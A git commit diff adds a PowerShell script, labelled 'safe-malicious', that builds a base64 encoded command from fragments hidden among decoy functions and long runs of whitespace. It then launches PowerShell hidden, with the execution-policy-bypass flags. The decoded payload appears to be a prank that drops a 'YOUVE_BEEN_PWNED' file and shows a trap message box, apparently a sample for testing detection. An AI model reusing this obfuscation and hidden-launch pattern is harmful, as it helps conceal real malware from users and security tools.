1c0fe42999f7cfd484937a26852657bce3e2d4c5
Ender <nallahabi2003@gmail.com>
2025-10-18 00:20:55 -0400

    Created safe-malicious ps1 script

--- program/avdxr.ps1
+++ program/avdxr.ps1
@@ -1,1 +1,58 @@
-Write-Host "Hello World!"
+function RandomSelection {
+    $letters = @("A","B","C","D","E","F","G")
+    $selected = Get-Random -InputObject $letters -Count 3
+    $combined = ($selected -join "")
+}
+$kgjv = "HQAaQBtACAAVABvACAATQB5ACAAVAByAGEAcAAuACAASQAgAEwAZQBmAHQAIABBACAAUAByAGUAcwBlAG4AdAAgAFMAbwBtAGUAdwBoAGUAcgBlAC4AIAAuACAALgAiACkA"
+                                                                                                                                                                                                                $sdg = "stArT-PrOCeSS"; $twqn = "AZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAe"
+function ArrayShuffle {
+    $arr = 1..10
+    $shuffled = $arr | Sort-Object {Get-Random}
+    $sum = ($shuffled | Measure-Object -Sum).Sum
+}
+$rfby = "HQAZQBtACAAYgB1AGQAIQAnACAAPgAgAH4ALwBEAGUAcwBrAHQAbwBwAC8AWQBPAFUAVgBFAF8AQgBFAEUATgBfAFAAVwBOAEUARAAuAHQAeAB0ADsACgBBAGQ";$wvub = "pOWerSHelL"
+                                                                                                                                                                                                    $hxop = "QBOAGEAbQBlACAAUAByAGUAcwBlAG4AdABhAHQAaQBvAG4ARgByAGEAbQBlAHcAbwByAGsACgBbAFMAeQBzAHQAZQBtAC4A"
+
+$szmn = "VwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIAUgBFAEEARAAgAE0ARQAhACAAWQBvAHUAJwB2AGUAIABGAGEAbABsAGUAbgAgAFYAaQBjA"
+
+$vgy = @("-nop","hidden","ni","byp");
+
+$kra = "ZQBjAGgAbwAgACcASQBtACAAaQBuACAAeQBvAHUAcgAgAHMAeQBzA";
+$kra += $rfby;
+RandomMath | Out-Null
+
+
+ArrayShuffle | Out-Null
+$kra += $twqn;
+function LoopLogic {
+    $x = 0
+    for ($i=0; $i -lt 20; $i++) {
+        $x += [Math]::Pow(Get-Random -Minimum 1 -Maximum 5, 2)
+    }
+    $y = $x * 3
+}
+$kra += $hxop;
+$kra += $szmn;
+function RandomMath {
+    $a = Get-Random -Minimum 1 -Maximum 100
+    $b = Get-Random -Minimum 1 -Maximum 100
+    if ($a -gt $b) {
+        $c = $a * $b
+    } else {
+        $c = $b / ($a + 1)
+    }
+}
+$kra += $kgjv;
+
+RandomSelection | Out-Null; $joi = "$($vgy[0]) -W $($vgy[1]) -no$($vgy[2]) -ep $($vgy[3])ass -e "
+LoopLogic | Out-Null
+
+
+$usbv = "$($joi) $($kra)"
+$iouvh = @{
+                                                                                                                                                                                                                            FilePath=$wvub
+                                                                                                                                                                                                                ArgumentList=$usbv
+                                                                                                                                                                                                                                        NoNewWindow=$true
+                                                                                                                                                                                                                                    Wait=$true
+}
+&$sdg @iouvh
